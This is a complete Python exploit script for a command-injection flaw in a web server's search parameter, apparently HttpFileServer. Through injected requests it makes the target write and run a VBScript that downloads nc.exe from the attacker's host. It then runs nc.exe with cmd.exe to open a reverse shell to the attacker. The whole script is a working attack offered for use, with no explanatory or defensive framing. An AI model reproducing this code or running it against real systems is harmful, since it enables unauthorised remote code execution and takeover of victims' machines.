import urllib.request as url
import urllib.error
import sys

if len(sys.argv) == 5:
    rhost = sys.argv[1]
    rport = sys.argv[2]
    lhost = sys.argv[3]  # local IP address
    lport = sys.argv[4]  # Local Port number
else:
    print("[-] Something went wrong..!")
    print("[-] Usage is: python %s <Target IP address> <Target Port Number> <Local ip where http server listen> <local port for the reverse shell>" % sys.argv[0])
    print("[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe")
    sys.exit(-1)

vbscript = r"C:\Users\Public\script.vbs"
ncdownurl = "http://" + lhost + "/nc.exe"
ncpathsave = r"C:\\Users\\Public\\nc.exe"
exe1 = "exec|" + "cscript.exe " + vbscript
exe2 = "exec|" + ncpathsave + " -e cmd.exe " + lhost + " " + lport

save = '''save|''' + vbscript + '''|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "''' + ncdownurl + '''", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "''' + ncpathsave + '''", 2 '//overwrite
end with
'''

try:
    # create vbs wget nc.exe
    url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(save) + ".}")

    # execute_script
    url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(exe1) + ".}")

    # nc_run():
    url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(exe2) + ".}")
except urllib.error.URLError:
    print("[-] Something went wrong..!")
    print("[-] Usage is: python %s <Target IP address> <Target Port Number> <Local ip where http server listen> <local port for the reverse shell>" % sys.argv[0])
    print("[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe")
    sys.exit(-1)
